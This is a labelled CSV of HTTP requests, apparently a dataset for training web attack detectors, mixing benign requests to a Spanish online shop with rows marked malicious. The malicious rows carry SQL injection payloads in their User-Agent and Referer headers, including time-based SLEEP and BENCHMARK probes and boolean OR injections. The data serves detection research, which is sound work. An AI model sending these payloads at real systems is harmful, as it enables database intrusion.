method,url,uri,query,headers,body,type
GET,/tienda1/publico/productos.jsp,/tienda1/publico/productos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7F2CA2797EAA2E7437D7D8635CF33E42,,benign
GET,/tienda1/global/menum.jsp,/tienda1/global/menum.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=58E515AB21E02E2E089D663A8A4E477F,,benign
POST,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=1C6EE7ADCB15E2F1DEB44F2C66958F50,errorMsg=Credenciales+incorrectas,benign
GET,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=97&B1=A%F1adir+al+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=5E9E4CC10DA4FCC8834D84E37B400BF8,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/ AND 8639=BENCHMARK(5000000,MD5(0x48617271))
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/vaciar.jsp,/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=398F32154C9D397DA45470C0536C1E72,,benign
GET,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,modo=entrar&login=arvy&pwd=pudrici%F3n&remember=off&B1=Entrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=55300587EF64A327076BE4C71ACFDCB3,,benign
POST,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=35F098AFE98852FC348D5A3CF8FA1F81,modo=registro&login=rathbun&password=T14a3o1&nombre=Alexandra&apellidos=Torrescana+Gelabert&email=shell.dancora%40rosaserigrafia.kh&dni=41099769B&direccion=Avenida+Manuel+Fernandez+Murube%2C+28%2C+4B&ciudad=Vilari%F1o+de+Conso&cp=17172&provincia=Guadalajara&ntc=2494761380533764&B1=Registrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' IN BOOLEAN MODE) OR 2961=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/ogono.jpg,/tienda1/miembros/imagenes/ogono.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=24445A36240F12904ED4E3B0C0AAD717,,benign
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=2E26764C09B95B631E5DA708EAD2B4A2,modo=registro&login=duisman&password=ALCAN%E1&nombre=Nuria&apellidos=Cuesp%E1n+Espa%F1a&email=allan_mosquini%40la-sexta-f1.ru&dni=70138802A&direccion=Lakuaburua%2C+S%2FN%2C+8-A&ciudad=Muntanyola&cp=08697&provincia=Girona&ntc=8250651035338571&B1=Registrar,benign
GET,/tienda1/imagenes/1.gif,/tienda1/imagenes/1.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=8A4BC02674913E2392E52C2E2121C8C3,,benign
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7C7ED3C614F33CB9789191F5DC52C644,modo=registro&login=leenher&password=bOL&nombre=Nino&apellidos=Mata+Saiz&email=hallahan%40simulacion-credito.lc&dni=26566596D&direccion=Calle+De+Les+Pitiuses+103+&ciudad=Numancia+de+la+Sagra&cp=47831&provincia=Salamanca&ntc=1829342632057013&B1=Registrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AND ELT(3476=3476,SLEEP(5)) AND (6271=6271
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5') AND (SELECT 9375 FROM (SELECT(SLEEP(5)))HXTZ)-- dsqM
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"" OR NOT 4684=2810-- QomS
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -5964) OR 8018=8018 AND (4959=4959
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
